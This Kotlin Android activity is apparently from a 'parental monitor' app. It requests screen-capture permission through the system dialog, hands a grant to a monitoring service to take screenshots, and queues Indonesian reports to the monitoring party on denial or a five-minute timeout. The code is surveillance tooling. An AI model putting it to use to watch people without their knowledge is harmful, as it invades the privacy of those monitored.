package com.redeye.parentalmonitor.ui

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.Background
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.utils.ScreenCapture
import com.redeye.parentalmonitor.utils.ServiceStart

class ShotConsentActivity : Activity() {

    private val safetyHandler = Handler(Looper.getMainLooper())
    private var outcomeHandled = false
    private val safetyFinish = Runnable {
        if (!outcomeHandled && consentInFlight) {
            outcomeHandled = true
            reportConsentFailure(timeout = true)
        }
        finishQuietly()
    }
    private var consentInFlight = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            safetyHandler.postDelayed(safetyFinish, SAFETY_MS)
        } catch (_: Exception) {
        }
        launchConsent()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (consentInFlight) {
            try {
                safetyHandler.removeCallbacks(safetyFinish)
                safetyHandler.postDelayed(safetyFinish, SAFETY_MS)
            } catch (_: Exception) {
            }
            return
        }
        launchConsent()
    }

    private fun launchConsent() {
        if (consentInFlight) return
        consentInFlight = true
        try {
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            @Suppress("DEPRECATION")
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CONSENT)
        } catch (_: Exception) {
            consentInFlight = false
            finishQuietly()
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        consentInFlight = false
        if (requestCode != REQ_CONSENT) {
            finishQuietly()
            return
        }
        val granted = resultCode == RESULT_OK && data != null
        val firstOutcome = !outcomeHandled
        outcomeHandled = true
        try {
            if (granted) ScreenCapture.grant(resultCode, data)
        } catch (_: Exception) {
        }
        try {
            Toast.makeText(
                this,
                getString(if (granted) R.string.setup_shot_ok else R.string.setup_shot_denied),
                Toast.LENGTH_SHORT
            ).show()
        } catch (_: Exception) {
        }
        if (granted) continueScreenshot()
        else if (firstOutcome) reportConsentFailure(timeout = false)
        finishQuietly()
    }

    override fun onDestroy() {
        try { safetyHandler.removeCallbacks(safetyFinish) } catch (_: Exception) {
        }
        super.onDestroy()
    }

    private fun reportConsentFailure(timeout: Boolean) {
        try {
            val appContext = applicationContext
            val text = if (timeout) {
                "⌛ <b>Izin tangkap layar tidak dijawab</b>\nDialog izin di HP ini dibiarkan sampai batas 5 menit tanpa jawaban, jadi tangkapan layar tidak bisa diambil."
            } else {
                "🚫 <b>Izin tangkap layar ditolak</b>\nDialog izin di HP ini ditutup tanpa persetujuan, jadi tangkapan layar tidak bisa diambil."
            }
            Background.runCritical {
                try {
                    PreferencesManager.refreshInstance(appContext)
                    val prefs = PreferencesManager.getInstance(appContext)
                    if (prefs.isConfigured() && !prefs.userDisabledMonitoring) {
                        MessageQueue.getInstance(appContext).addMessage(text, true)
                        MessageScheduler.scheduleMessageSend(appContext)
                    }
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun continueScreenshot() {
        try {
            val intent = Intent(this, MonitoringService::class.java)
                .setAction(MonitoringService.ACTION_AFTER_SHOT_GRANT)
            ServiceStart.startForeground(this, intent)
        } catch (_: Exception) {
        }
    }

    private fun finishQuietly() {
        if (isFinishing || isDestroyed) return
        try {
            @Suppress("DEPRECATION")
            overridePendingTransition(0, 0)
        } catch (_: Exception) {
        }
        try { finish() } catch (_: Exception) { }
    }

    companion object {
        private const val REQ_CONSENT = 7041
        private const val SAFETY_MS = 5 * 60_000L
    }
}
